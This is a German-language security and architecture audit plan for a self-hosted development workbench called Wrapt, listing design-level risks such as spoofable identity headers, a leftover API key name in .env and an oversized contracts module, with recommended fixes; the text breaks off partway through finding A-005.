# Project Audit and Improvement Plan

> Auditdatum: 10. Oktober 2026
> Projektversion: 2.2.9 (pnpm-Monorepo, Node >= 22, pnpm 10.29.2)
> Status: `Partial` — tiefe statische Analyse ohne Laufzeit-Neustart, ohne schreibende Tests
> Betriebsannahme: Single-User-Hauptbetrieb, `allowedUsers` kann mehrere Identitaeten enthalten
> Methode: 5 parallele Spezial-Audits (Architektur/Codequalitaet, Backend/Daten, Security, Performance/Build, Frontend/UX/Tests), read-only, keine Projektdatei geaendert

## 1. Executive Summary

### Allgemeiner Zustand

Wrapt ist eine klar strukturierte, selbst gehostete Remote-Development-Workbench: Fastify-Backend
(`apps/server`, Port 3010, API `/api/v1`), React/Vite-Frontend (`apps/web`, als `dist/` vom Server
ausgeliefert), geteilte Zod-Vertraege (`packages/contracts`, `packages/extension-contracts`),
eine externe SQLite-Datei (`wrapt.sqlite`, live ca. 457 MB) plus `extensions.sqlite`, dazu
Terminal-Supervisor (tmux, eigene User-Unit), Preview-Slot-Gateway (60 Listener 3901–3960 intern,
Tailscale-Ports 8451–8462 + 8511–8558), Hermes-Dashboard-Proxy (`/hermes`), T3-Code-Proxy (`/t3`,
Port 3773), OpenCode-Web-Proxy, code-server-Proxy, Notification-Poller (T3/OpenCode/Codex/Hermes),
Restart-Pipeline (`scripts/restart-*.sh` + `systemd-run`-Transienten + Health-Poll auf
`bootId`/`webBuildId`). CI-Pipeline (`quality.yml`) ist ueberdurchschnittlich: frozen Lockfile,
typecheck, eslint `--max-warnings=0`, 400-Zeilen-Limit, Tests, Coverage, Artifact-Retention,
Security-Audit, E2E mit tmux + Chromium.

### Befundanzahl (kanonische Quelle: Abschnitt 4)

| Schweregrad | Anzahl |
| --- | ---: |
| Critical | 1 (B-001 Secret in `.env`) |
| High | 29 |
| Medium | 45 |
| Low | 8 |
| Informational | 0 |
| **Gesamt** | **83** |

Verteilung: Architektur 16 (A), Backend/Daten 17 (D), Security 15 (S), Performance 17 (P),
Build/Deps 8 (B), UX 16 (U), Tests/Observability 4 (Q).

### Groesste Risiken

1. **Klartext-Secret + tote Mistral-Reste** (B-001, Critical): `MISTRAL_API_KEY` liegt noch in
   `.env` (Zeilen 20–29, „Tech TLDRs"-Block mit `MISTRAL_*`/`NEWS_*`), obwohl Mistral laut Betreiber
   nicht mehr benutzt wird und kein Code diese Variablen liest (Repo-Grep: null Treffer in
   `apps/`, `packages/`, `scripts/`). Block ersatzlos aus `.env` loeschen, Key beim Anbieter
   deaktivieren, Doku-/Inventar-Reste bereinigen.
2. **Fehlende Admin-Trennung bei System-Routen** (S-001 bis S-003, High): Jeder `allowedUsers`-Eintrag
   kann Restart/Update ausloesen, global KI-Accounts umschalten und `wrapt.local.json` (inkl.
   T3-Kanal mit npm-Install + `state.sqlite`-Migrationsrisiko) persistent aendern.
3. **Keine Mandanten-Isolation** (S-004, High bei Multi-User): Orbit/Notes/Filesystem/Projects/Skills
   sind global ohne `userId`. Zweiter `allowedUsers`-Eintrag sieht und ueberschreibt alles.
4. **Loopback-Header-Spoofing** (S-006, High): Jeder lokale Prozess (Terminal, Preview-DevServer)
   kann `tailscale-user-login` faelschen und wird als beliebige Identitaet inkl. Admin akzeptiert.
   Projekt-Code = Workbench-Admin.
5. **Preview-Gateway ohne AuthN** (S-005, High): Slot-Listener ohne Identitaetspruefung, Cookies
   hostweit geteilt. Tailnet-Fremde mit Slot-URL erreichen fremde DevServer-Inhalte.
6. **Stille Datenverluste**: Orbit Last-Write-Wins mit Legacy-Fallback (A-007, D-005),
   Notes-Metadaten ohne Optimistic Locking (D-004), Restart-Reload ohne Dirty-Guard (U-002).
7. **Unbegrenztes Wachstum**: Orbit-Revisionen 500 Vollkopien = 71 MB + 320 MB freelist-Bloat
   (P-011), Kosten-Tabellen ohne Retention (D-001), ungelesene Notifications nie geprunt (D-002),
   Restart-Logs ohne Rotation (D-015).
8. **Polling-Sturm + SQLite-Contention** (P-004, P-010): `no-store` + 1,5–30-s-Intervalle pro Tab
   gegen ein geteiltes 1200/min-Budget (alles `127.0.0.1` hinter Tailscale); 15 Connections auf
   eine Datei mit `synchronous=FULL`, kein Retry.

### Wichtigste technische Schulden

- Contracts-Monolith (`index.ts`, 1975 Zeilen), God-Factory `createAppDependencies`, gefrorener
  Import-Seiteneffekt `settings`, 7 uebergrosse Preview-Dateien, Frontend-God-Views mit Logik in UI,
  Extension-Dual-Katalog, `!`-Flut + `as unknown`-Casts ohne Zod-Guards, zwei Asset-Stores,
  Legacy-Shims ohne Sunset-Datum (A-001–A-003, A-006, A-008, A-015, A-016).
- Inkonsistente Fehlerformate (`HermesClientError`/`TerminalFailure` → anonymes 500),
  Best-effort-`catch` ohne Kontext, Audit-Write mit Delete-Scan pro Mutation (D-013, D-014, D-016).
- Bundle ohne Budget (NoteEditor 1,2 MB, Entry mit KaTeX-Fonts), Dashboard eager mit 11 Queries,
  Voll-Dokument-Subscriptions mit Voll-Re-Render, 4-MB-Orbit-Saves mit doppeltem `JSON.stringify`,
  `LIKE %q%`-Notes-Suche ohne FTS/Limit, blockierendes FS im Event-Loop (P-001–P-003, P-005, P-007, P-012, P-015).

### Kurzfristige Massnahmen (naechste 1–2 Wochen)

1. B-001: Mistral-Reste entfernen — `.env`-Block (Zeilen 20–29) loeschen, Key beim Anbieter
   deaktivieren (keine Rotation noetig, wird nicht mehr benutzt), Doku-/Inventar-Reste bereinigen.
2. S-001–S-003: `requireWorkbenchAdmin` fuer Restart/Update/Account-Switch/Config-Mutationen.
3. S-004: Entweder `allowedUsers` auf 1 begrenzen + Warnung, oder Multi-User als nicht isoliert
   dokumentieren; Skills-Mutationen hinter Admin.
4. S-006: Doku „Projekt-Code ist vertrauenswuerdig" + `editorOpen`-IP-Fix; sensible Mutationen
   perspektivisch mit Capability-Token.
5. S-008/S-009/S-010: Health-CORS `*` entfernen, `POST /notifications/report` limitieren,
   `sanitizeName` haerten.
6. D-002/D-004/D-005: Notification-Cap, `expectedRevision` fuer Notes-Update, Konfliktsignal auch
   fuer Legacy-Orbit-Saves.
7. P-011: Orbit-Revision-Retention 500 → 100 + `VACUUM`-Plan; P-004: Background-Polling drosseln.
8. U-002/Q-001: Restart-Abbruch + Dirty-Confirm, ErrorBoundary-Retry-Loop fixen.

### Langfristige Massnahmen

- Preview-Gateway-Auth (Slot-Token oder Tailscale-Identitaet) + Cookie-Isolation (S-005).
- T3/Hermes auf eigene Origin statt Pfad-Proxy, oder strikter CSP-Merge (S-007).
- Orbit-Konflikt-UI statt Auto-Rebase, Operation-basiertes Save (A-007).
- Contracts-Split, DI-Phasen-Boot, Settings-Accessor, Preview-Routing-Schicht (A-001–A-004).
- Notes-FTS + Pagination, Preview-Sharable-Suche in SQL, Terminal-Quota atomar (D-003, D-006, D-008).
- Bundle-Budgets, Zustand-Selektoren, WS-Hub mit Jitter, DB-Split bei 100+ Nutzern (P-Abschnitt,
  Skalierungstabelle in Abschnitt 7).
- Echte Mandanten-Trennung oder Instanz-pro-Benutzer (S-004), Config aus Terminal-Roots
  ausnehmen (S-011), Preview-Befehls-Bestaetigung (S-013).

## 2. System Overview

### Architektur

```
Browser (Tailscale-URL / 127.0.0.1:3010)
  → Tailscale Serve (setzt tailscale-user-login)
  → 127.0.0.1:3010 Fastify (trustProxy 127.0.0.1/::1)
      → Identity-Hook (workbench-identity) → Same-Origin-Check (Mutationen)
      → Routen: api/ orbit/ previews/ terminal/ extensions/ plugins/ hermes/
                  notifications/ filesystem/ usage/ skills/ system/ workspaces/
                  security/ config/ observability/
      → SQLite: wrapt.sqlite (Orbit+Revisionen, Notes, Notifications, Terminals,
                  Preview-Slots/Sessions/Bindings, Workspaces, Audit, Usage)
        + extensions.sqlite + orbit-backups/*.json + data/restart-logs/
      → statisch: apps/web/dist
  → Proxys: /t3 → 127.0.0.1:3773 | /opencode → 3774 | /editor → code-server 8080
            /hermes → 9119 | /assets, /.well-known/t3/
  → Slot-Listener 127.0.0.1:3901–3960 → Tailscale-Public-Ports (Gateway, kein helmet,
     kein Rate-Limit, keine Identitaet)
  → tmux-Supervisor (eigene Unit, Socket $XDG_RUNTIME_DIR/wrapt/) + wrapt-previews-tmux
  → systemd User-Units: wrapt.service, wrapt-terminal-supervisor, hermes-*, t3-code.service
  → Poller: liveUsage/analytics/usageTimeline/hermesResultSync/t3StatusSync/
            terminalStatusSync/agentSessionSync (je ~5 s) + metricsHistory 5 s
```

### Wichtigste Komponenten

- **Server-Boot** (`app/buildApp.ts` → `app/dependencies.ts` ~40 Services → `app/routes.ts`):
  God-Factory, alles-oder-nichts, Seiteneffekte in Konstruktoren (A-002).
- **Config** (`config/settings.ts` gefrorener Import-Seiteneffekt mit dotenv+chmod+migrate+Zod-throw;
  `config/wrapt-config.ts` mit Port-Matrix; A-003, A-005).
- **Contracts**: `packages/extension-contracts` → `packages/contracts` (`index.ts` 1975 Zeilen
  Monolith) → Server+Web; Build-Reihenfolge in `pnpm dev/build` erzwungen (A-001).
- **Orbit**: Single-Row-Dokument `id='default'` + `revision`, `PUT /orbit {document, expectedRevision}`
  + Header-Weiche `x-wrapt-sync-version: 2` vs. Legacy, 4-MB-Limit, 50-%-Drop-Guard (Heuristik),
  Konflikt-Backups ohne UI (A-007, D-005).
- **Previews**: `PreviewSlotService.openSession` (eine Transaktion + danach Snapshot-`publish`),
  aber Snapshot nur im RAM; 7 uebergrosse Dateien; Feature-Flag-Matrix (gatewayV2/bridge/
  diagnostics/storage/opt-in/slotReset); DevServer-Ausfuehrung via `bash -lc` in tmux bzw.
  `systemd-run --scope` (persistiert ueber Restart); Watchdog mit Auto-Restart (A-004, D-006, S-013).
- **Terminal**: WS `create/attach/input/resize` + `runtimeId`-Dedup → node-pty/tmux; RAM-Maps
  (sessions/creationLocks/cwdRefreshTimers); nur markierte Sessions ueberleben Reboot (A-014).
- **Notifications**: Poller lesen fremde SQLite (`~/.t3/.../state.sqlite`, `opencode.db`,
  Codex-Sessions) mit `PRAGMA table_info` + `as unknown`-Casts; globale Tabelle, jede erlaubte
  Identitaet sieht alles; TTL 1 h/24 h + 48-h-Prune nur fuer gelesene (A-013, D-002).
- **Restart/Update**: `POST /system/restart` → detached `scripts/restart-*.sh` (sichtbarer Build,
  dann `systemd-run`-Transient) → Client pollt `health` auf `bootId`/`webBuildId`; Lock via `mkdir`
  ohne Stale-Erkennung; Logs ohne Rotation; kein Idempotenz-Key (A-009, D-015).
- **Hermes/T3**: HTML-Rewrite-Proxys mit manueller Cache-Version (`assetRewriteVersion="3"`),
  Session-Token aus Dashboard-HTML gescrapt, DOM-Selektor-Kopplung an T3-Markup, WS-Puffer 4/16 MB
  (A-011, A-012).
- **Frontend**: `views/OrbitWorkbench.tsx` (1232), `Dashboard.tsx` (854),
  `FileManagerPanel.tsx` (755), `OrbitNodeView.tsx` (639); Stores `orbit.ts` (574) mit
  `getState()` im Render; ~15 Orbit-Geometrie-Helper; `extensions/legacyPageRoutes.ts` (664,
  nur Dashboard eager); Design-System `@theme` in `index.css` als einzige Farbquelle (A-006, U-016).

### Datenfluesse

Browser → Fastify-Identity (`tailscale-user-login`/Loopback-Trust/Dev-User) → Same-Origin bei
Mutationen → Route → Zod-Parse → SQLite/Tmux/Upstream-Proxy → Antwort. Orbit: Voll-Dokument-Save
mit Revisions-Lock. Terminal: WS-Frames → PTY. Preview: `openSession` (atomare Slot-Transaktion)
→ In-Memory-RoutingSnapshot → Gateway proxy't HTTP/WS an `127.0.0.1:<targetPort>` mit URL-/CSP-/
Bridge-Rewrite. Notifications: Fremd-DB-Poll → globale Tabelle → SSE/Push (VAPID).

### Externe Dienste und kritische Abhaengigkeiten

Tailscale Serve (einziger Auth-Anker), npm (`t3@stable|nightly`-Install beim Kanalwechsel),
Ehemals Mistral/News-Sync (Code in Release 1.8.0 entfernt, kein Leser im Code — nur `.env`- und
Doku-Reste, siehe B-001), Push-Dienste (VAPID), Hermes-CLI (`cliPath`/`pythonPath`
aus Config ausführbar), Systemd-User-Units, tmux, `ss`/`systeminformation` (Metrics),
`codexbar`-CLI (`--days 3650`-Import), SQLite (`node:sqlite` sync API).

### Vertrauensgrenzen

A) Tailnet → Tailscale Serve → Backend (Header `tailscale-user-login`, fälschbar bei
Loopback-Zugang). B) Loopback vs. Tailnet (TCP-identisch, nur Header-Heuristik; gleiche UID
kann alles lesen). C) Workbench-Origin (Same-Origin nur fuer Mutationen mit Origin/Fetch-Metadata;
Header-lose Mutationen passieren still). D) Slot-Origins (keine Pruefung, hostweite Cookies).
E) Pfad-Proxys `/t3`, `/hermes` (Upstream-CSP entfernt, Bridge injiziert — Upstream-XSS =
Workbench-Origin-XSS).

### Besonders sensible Bereiche

`preview-storage.key`, `preview-log-hmac.key`, `preview-agent-capability`, `editor-open-capability`
(0600), `notifications/vapid.json` (0600), KI-`auth.json`-Symlinks (serverweiter Switch),
`.env` (aktuell mit Secret), `config/wrapt.local.json` (Pfade inkl. ausfuehrbarer CLI-Pfade),
`wrapt.sqlite` (alles), Orbit-Dokument (4 MB, Secrets in Revisionen/Backups), FileManager-Root =
Home (Dotfiles!), Extension-Permissions/Lifecycle, T3-`state.sqlite` (Downgrade-Risiko).

## 3. Audit Scope and Method

### Untersuchte Ordner und Systeme

- Doku/Config: `README.md`, `AGENTS.md`, `docs/architecture.md`, `docs/configuration.md`,
  `package.json`, `pnpm-workspace.yaml`, `pnpm-lock.yaml` (10.060 Zeilen), `config/wrapt.example.json`,
  `.env`/`.env.example`, `deploy/systemd/units/`, `.github/workflows/quality.yml`,
  `apps/web/vite.config.ts`, `apps/web/dist/` (vermesssen: 21 MB, JS 8,26 MB, CSS 1,74 MB).
- Server: `apps/server/src/app/*`, `api/*`, `system/*`, `security/*`, `config/*`,
  `orbit/*`, `notes/*`, `previews/*` (slots/gateway/database/storage/DevServerManager/bridge/
  diagnostics/routes), `usage/*`, `terminal/*`, `notifications/*`, `extensions/*`,
  `projects/*`, `workspaces/*`, `observability/*`, `hermes/*`, `services/t3Proxy*`,
  `filesystem/*`, `adapters/*`.
- Frontend: `apps/web/src/views/*`, `components/*`, `stores/*`, `lib/*`, `extensions/*`,
  `index.css` (+ `@theme`-Block), `e2e/*`, 166 `*.test.*`.
- Live-Stichproben (read-only, `mode=ro`): `wrapt.sqlite` (457 MB, 457 MB `.bak`, 116.981 Pages,
  freelist 78.181 ≈ 320 MB, Tabellen-Groessen via `dbstat`).

### Nicht vollstaendig gepruefte Bereiche

- Laufzeit-Verhalten unter Last (kein Restart/Build ausgefuehrt — haette die Audit-Session
  gekillt; kein Playwright-Run, kein Lighthouse, kein Heap-Snapshot, kein `EXPLAIN ... ANALYZE`
  unter Last, kein `VACUUM`).
- `lifecycle.ts`-Poller-Intervalle nur angerissen; `observability/audit`-Hashkette nicht tief;
  `routing.ts`/`reset.ts`/`sessionLifecycle.ts`/`runtimeProfiles.ts` nicht Zeile-fuer-Zeile;
  `process.ts`/`sessionCreation.ts`/`snapshots.ts`/ConPTY-Pfad nur angerissen;
  `extensions/runtime-host.ts`/`release-store.ts`/Capability-Broker nur oberflaechlich;
  `hermes/token.ts`/`route-bridge.js`/`t3RouteBridge.js`/`opencodeWebProxy.ts` Detail lueckenhaft;
  `layout.ts` (363), `PreviewHub.tsx`, `Settings.tsx`, CSS (5057 Zeilen) nicht tief;
  `verify-service-restart.sh`/`sync-t3-channel.sh`/`sync-opencode-web.sh` nur referenziert.
- Keine Testlaeufe (`typecheck`/`lint`/`test` nicht ausgefuehrt — read-only-Auftrag; Reports der
  Subagenten beruhen auf Code-Lektuere + `rg`/`wc`/Dist-Vermessung + Live-DB-Counts).
- Keine zyklische Import-Graph-Analyse per Tool (nur Stichproben); keine Laufzeit-Metriken.

### Ausgefuehrte Befehle und Pruefungen (alle read-only)

Datei-/Verzeichnis-Lektuere, `rg`-Querys (Routen, `BEGIN/COMMIT`, `catch`, `LIMIT/OFFSET`,
`PRAGMA foreign_keys`, Timeouts, `as unknown`, `eslint-disable`, `!`, `process.env`,
`localStorage`, `getState`, `#[0-9a-fA-F]`), `wc`/Zeilen-Checks (`check-file-lines`-Baseline),
`du -b dist/assets`, `build-manifest.json`-Eintraege (217), `index.html`-Preloads (22) gezaehlt,
Prod-DB-Counts/Indizes/Orphans/Ranges via SQLite-Reads, `.env`-vs-`.example`-Diff (Namen, nie Werte).

### Annahmen

- Betrieb als private Workbench im Tailnet, kein Funnel; Tailscale-Proxy setzt Identity-Header
  korrekt und strippt Client-Header (Härtung S-006 setzt das voraus).
- Single-User-Hauptbetrieb; `allowedUsers > 1` ist moeglich, aber ohne Isolation (S-004).
- Vorschau-/Terminal-Inhalte stammen aus vertrauenswuerdigen Projekten (S-006/S-013 als Doku-Annahme
  bis Härtung umgesetzt).
- `data/`-Backups enthalten Secret-Dateien (S-015).

### Externe Quellen

Vite-Docs (`manualChunks`/`modulepreload`/`assetsInlineLimit`), React-Docs
(`useSyncExternalStore`/memo), TanStack-Query (`staleTime`/`refetchIntervalInBackground`),
`@xyflow/react`-Perf, SQLite-Docs (WAL, `synchronous`, `busy_timeout`, `VACUUM`, `dbstat`, FTS5),
Fastify (`compress`/`rate-limit`/`static preCompressed`), Node `node:sqlite`-API,
pnpm (`overrides`/`frozen-lockfile`/`audit`), systemd (`Restart`/`EnvironmentFile`/`LoadCredential`),
`systeminformation`-Kosten, GH-Actions/Playwright-Caching. Advisories hinter Overrides
(`brace-expansion`, `colord`, `fast-uri`, `ip-address`, `find-my-way`) via `pnpm audit` zu
verifizieren (in diesem Audit kein Netzwerk-Run).

### Coverage-Matrix

| Bereich | Status | Methode | Luecken | Restrisiko |
|---|---|---|---|---|
| Doku/Config/Workspace | geprueft | Vollread + Schema-Gegenprobe | Laufzeit-`wrapt.local.json` privat, nicht gelesen | lokaler Config-Drift |
| Server-Boot/Routen/Security/Config | geprueft | Read + rg | `lifecycle`-Poller angerissen, Audit-Hashkette nicht tief | Backpressure/Rotation offen |
| Previews (Slots/Gateway/Bridge/DevServer/Storage/Diagnostik) | teilweise | Head-Reads 7 Dateien + Tests-Namen | routing/reset/sessionLifecycle/runtimeProfiles nicht Zeile-fuer-Zeile | Snapshot-Rebuild nach Boot |
| Orbit (DB/Routen/Store/Canvas) | geprueft | Read DB/Routen/Store/Workbench-Head + Sync | Asset-Quotas, `migrateOrbitNotes` nur Liste | Quota-DoS, Migrations-Edge |
| Terminal (Manager/Supervisor/Restore) | teilweise | Head + Tests-Namen | process/sessionCreation/snapshots/ConPTY nicht gelesen | Windows-Pfad, TOCTOU |
| Extensions/Plugins/Skills | teilweise | Manager-Head + Deps + Verzeichnisliste | runtime-host/release-store/Broker nicht tief | Sandbox-Bypass-Rest |
| Hermes/T3/OpenCode-Proxys | teilweise | Proxy-Heads + Arch-Doku | token/bridges/opencodeProxy Detail lueckenhaft | Upstream-Drift |
| Contracts | teilweise | Struktur + Head + Counts | einzelne Schemas nicht alle validiert | Schema-Drift |
| Web-Stores/Views/Lib/CSS | teilweise | Counts + Heads + rg | layout.ts/PreviewHub/Settings/CSS nicht tief | Render-Perf, Mobile-Sync |
| Restart-/Sync-Skripte | geprueft (teilweise) | Vollread lib-restart + Wrapper | verify/sync-*.sh nur referenziert | T3/OpenCode-Sync-Fehlerpfade |
| Groesse/Duplikate/Totcode/Magic/any/Lint-Disables/UI-Logik/Globals | geprueft | file-lines-Baseline, wc/rg | kein Zyklen-Graph-Tool, keine Laufzeit-Metriken | Zyklen jenseits Preview/Orbit |
| Datenintegritaet/DB-Logik | geprueft | alle database.ts + Live-Counts | E2E-Frontend-Verhalten bei 409/Retry | Race-Frontend |
| Security-Flows | geprueft | Identity/Origin/Gateway/Proxy/Upload-Roots gelesen | kein dynamischer Angriffstest | Replay/Undokumentiertes |
| Performance/Bundle/DB-Groessen | geprueft | dist vermessen, dbstat, Polling-Matrix | kein Lighthouse/Profiler/HAR/Heap | reale LCP/CLS unbekannt |
| E2E/Tests/CI-Config | geprueft (statisch) | Skripte + e2e-Namen + 166 Unit-Tests inventarisiert | keine Testlaeufe | Abdeckung nur statisch bekannt |

## 4. Detailed Findings — Architektur und Backend/Daten (A, D)

### A-001 Contracts-Monolith blockiert Build und Reviews

**Kategorie:** Architektur/Modulgrenzen
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `packages/contracts/src/index.ts` (1975 Zeilen), `packages/contracts/src/*.ts`, `apps/server/src/app/dependencies.ts:2`
**Betroffene Funktionen oder Komponenten:** `isoDateSchema`, `preview*`-, `orbit*`-, `project*`-, Health-/Restart-/T3-Schemas
**Problembeschreibung:** Fast alle Domaenen in einer Datei. Jede Schema-Aenderung baut `@wrapt/contracts` neu und invalidiert Server+Web.
**Technische Ursache:** `export *` aus Split-Dateien existiert, aber Neues landet in `index.ts` statt in Domaenenmodulen. Kein Barrel-Lint.
**Ausloeser:** Preview- oder Orbit-Feld hinzufuegen.
**Beispielszenario:** Dev aendert Orbit-Limit → `pnpm --filter @wrapt/contracts build` vergessen → Laufzeit-Zod-Mismatch erst im E2E.
**Auswirkungen:** Lange Builds, Merge-Konflikte, unuebersichtliche API-Oberflaeche.
**Warum es leicht uebersehen wird:** Split-Dateien suggerieren Ordnung; `index.ts` waechst schleichend.
**Empfohlene Loesung:** `index.ts` nur Re-Export; Domaenen splitten (`preview/`, `orbit/`, `system/`); Barrel-Test (kein `z.object` in `index.ts`); Baseline senken.
**Betroffene Architekturentscheidungen:** API-Vertraege zuerst in Contracts (AGENTS.md-Konvention bleibt, nur Ablage disziplinieren).
**Alternativen:** Monolith lassen + strikte Review-Regel — Trade-off: keine Tool-Garantie, weiter Drift.
**Trade-offs:** Importpfad-Aenderungen, Re-Exporte behalten; einmaliger Review-Aufwand.
**Implementierungsschritte:** 1. Domaenen-Ordner anlegen. 2. Schemas verschieben. 3. `index.ts` auf Re-Export reduzieren (<200 Zeilen). 4. Barrel-Lint/Test. 5. Docs-Beispiel anpassen.
**Tests:** `pnpm --filter @wrapt/contracts test`, `typecheck`, grep `^export const.*Schema` in `index.ts` = 0.
**Akzeptanzkriterien:** `index.ts` <200 Zeilen, alle Schemas domaenenzugeordnet.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### A-002 `createAppDependencies` ist God-Factory, Boot ist alles-oder-nichts

**Kategorie:** Architektur
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `apps/server/src/app/dependencies.ts` (388), `apps/server/src/app/buildApp.ts:43`, `apps/server/src/app/lifecycle.ts`
**Betroffene Funktionen oder Komponenten:** `createAppDependencies()`
**Problembeschreibung:** ~40 Services werden sequenziell/synchron konstruiert (u. a. `UsageDatabase`, `ProjectBrowserService.create`, Skill-Services, `extensionManager.reconcileRuntime()+syncCatalogUpdates()`, `previewSecrets.capabilityToken()` als Seiteneffekt). Ein Fehler (z. B. Browser-Root fehlt) verhindert den gesamten Boot.
**Technische Ursache:** Kein DI-Container, kein Lazy-Init, keine Phasen (config → storage → runtime → proxy → pollers).
**Ausloeser:** Defekter Pfad, volle Platte, korrupte Extension-DB beim Start.
**Beispielszenario:** `orbitBackupDirectory` nicht schreibbar → `OrbitDatabase`-Ctor wirft → kein Health, kein Restart-Status.
**Auswirkungen:** Fragiler Start, schwer testbar, zyklische Importgefahr.
**Warum es leicht uebersehen wird:** Boot funktioniert im Happy Path; optionale Services fallen nur im Fehlerfall auf.
**Empfohlene Loesung:** In Phasen aufteilen; fallible Services mit `Result` + degraded Health; Seiteneffekte aus Ctor in `start()`; Boot-Test mit defektem Verzeichnis.
**Betroffene Architekturentscheidungen:** Boot-Reihenfolge wird explizit (Phasen statt impliziter Ctor-Reihenfolge).
**Alternativen:** Nur try/catch um optionale Services — Trade-off: schnell, aber keine Struktur.
**Trade-offs:** Groesserer Umbau am Boot; Health-Semantik (`degraded`) muss dokumentiert werden.
**Implementierungsschritte:** 1. Phasen definieren. 2. Ctor-Seiteneffekte nach `start()` verschieben. 3. `Result`-Wrapper fuer optionale Services. 4. Degraded-Health. 5. Boot-Tests (defektes Verzeichnis, korrupte Extension-DB).
**Tests:** Unit `createAppDependencies` mit gemocktem FS; Start mit fehlendem `dataDir`.
**Akzeptanzkriterien:** Einzelner defekter optionaler Service (Skills, Codexbar) blockiert Boot nicht.
**Abhaengigkeiten:** Q-Testplan (Boot-Tests).
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### A-003 `settings` ist gefrorener Import-Seiteneffekt

**Kategorie:** Wartbarkeit/Testbarkeit
**Schweregrad:** High
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `apps/server/src/config/settings.ts` (391), `apps/server/src/config/wrapt-config.ts:291-308`, `apps/server/src/services/t3Proxy.ts:12`, `apps/server/src/hermes/dashboard-proxy.ts:11`
**Betroffene Funktionen oder Komponenten:** `export const settings = Object.freeze({...})`
**Problembeschreibung:** `dotenv.config + chmodSync + loadWraptConfig (sync read + migrateLegacyPersistentData) + Zod-parse + throw` laeuft beim ersten Import. Proxys frieren `t3Authority`, Prefix, Ports dabei ein. Tests brauchen Env-Hacks.
**Technische Ursache:** Modulladung = Konfigurationsladung + FS-Mutation.
**Ausloeser:** Import in Test, E2E mit anderer DB, Kanalwechsel zur Laufzeit.
**Beispielszenario:** `T3_PORT` nach Start geaendert → Proxy nutzt weiter alten Port bis Prozessneustart, ohne Hinweis.
**Auswirkungen:** Schwer mockbar, versteckte Boot-Fehler, Config-Drift.
**Warum es leicht uebersehen wird:** Einmaliger Import sieht harmlos aus; Freeze wirkt „sicher".
**Empfohlene Loesung:** `loadSettings(env, fs)`-Funktion + `getSettings()`-Accessor; Proxys lesen zur Request-Zeit; `chmod/migrate` nur in explizitem `init()`.
**Betroffene Architekturentscheidungen:** Config-Lebenszyklus (laden → validieren → einfrieren → injizieren).
**Alternativen:** Status quo + Test-Hacks — Trade-off: keine Verbesserung.
**Trade-offs:** Viele Importstellen anzupassen.
**Implementierungsschritte:** 1. Loader-Funktion extrahieren. 2. Accessor einfuehren. 3. Proxy-Lesestellen umstellen. 4. `init()` fuer FS-Mutationen. 5. Lint-Regel (kein `readFileSync/chmod` auf Import-Ebene).
**Tests:** `settings.test` ohne FS; Proxy-Port-Reload-Test.
**Akzeptanzkriterien:** Kein `readFileSync/chmod` auf Import-Ebene.
**Abhaengigkeiten:** A-002 (Boot-Phasen).
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### A-004 Preview-Subsystem: 7 uebergrosse Dateien, Snapshot nur im RAM

**Kategorie:** Fragile Architektur
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/slots.ts` (644), `gateway.ts` (668), `database.ts` (613), `DevServerManager.ts` (534), `bridge.ts` (515), `diagnostics.ts` (465), `routes.ts` (466), `routing.ts`, `reset.ts`, `sessionLifecycle.ts`
**Betroffene Funktionen oder Komponenten:** `PreviewSlotService`, `PreviewGateway`, `PreviewRuntimePublications`
**Problembeschreibung:** Kommentar `slots.ts:80-85` verspricht „eine Transaktion + danach Snapshot publizieren", aber `snapshot: RoutingSnapshot` ist reines RAM-Feld. DB ueberlebt Restart, Snapshot-Aufbau danach ungeprueft. Dazu Feature-Flags-Matrix mit 4 Cache-Pfaden.
**Technische Ursache:** Historisch gewachsen (alle in `check-file-lines`-Allowlist); DB + Routing + HTTP-Rewrite + WS + Storage-Reset in einem Cluster.
**Ausloeser:** Backend-Neustart bei aktiver Session; Flag-Kombi `gatewayV2=false + bridge=true`; `maxInjectableHtmlBytes`-Ueberschreitung.
**Beispielszenario:** Restart → Slot-DB aktiv, Gateway-Snapshot leer/alt → Previews 404 bis naechste `openSession`, Diagnose `bridgeUnavailable`.
**Auswirkungen:** Nicht-reproduzierbare Preview-Ausfaelle, schwerer Incident-Debug.
**Warum es leicht uebersehen wird:** Happy Path (open → surfen) funktioniert; Restart-Fall selten getestet.
**Empfohlene Loesung:** Snapshot-Load aus DB beim Boot + Test; `routing/` als eigene Schicht mit Invarianten-Test; Flags auf 1–2 unterstuetzte Kombis reduzieren; Dateien nach Verantwortung teilen (kein `part2`).
**Betroffene Architekturentscheidungen:** Routing wird eigene Schicht mit Rebuild-Garantie.
**Alternativen:** Nur Rebuild beim Boot ohne Schicht-Trennung — Trade-off: weniger Struktur, schneller.
**Trade-offs:** Beruehrt laufende Nutzer-Previews (hohes Umsetzungsrisiko).
**Implementierungsschritte:** 1. Boot-Rebuild aus DB. 2. Invarianten-Tests. 3. Routing extrahieren. 4. Flag-Matrix reduzieren. 5. Dateien teilen.
**Tests:** Restart-Replay-Test (DB→Snapshot); Gateway-Matrix-Test; `diagnostics.test.ts` erweitern.
**Akzeptanzkriterien:** Nach Prozessneustart sind alle aktiven Slots ohne Neu-`open` erreichbar.
**Abhaengigkeiten:** D-006 (Query-Reduktion) sinnvoll vorher.
**Geschaetzter Umfang:** Extra Large
**Risiko bei der Umsetzung:** High

### A-005 Port-Konfiguration an 3 Stellen dupliziert

**Kategorie:** Konfiguration
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Confirmed
**Betroffene Dateien:** `config/wrapt.example.json:176-182`, `apps/server/src/config/wrapt-config.ts:149-178,237-281`, `apps/server/src/config/settings.ts:223-226`, `apps/server/src/app/dependencies.ts:138` (`forbiddenTargetPorts`)
**Betroffene Funktionen oder Komponenten:** `slotPorts/publicPorts/allowedProjectPorts`, `listenerPorts`-Check
**Problembeschreibung:** 60er-Listen + Defaults + `superRefine`-Kollisionsregeln + zweiter `listenerPorts`-Eindeutigkeitstest. Drift bei Port-Aenderung + `configure-tailscale-serve.sh` manuell noetig.
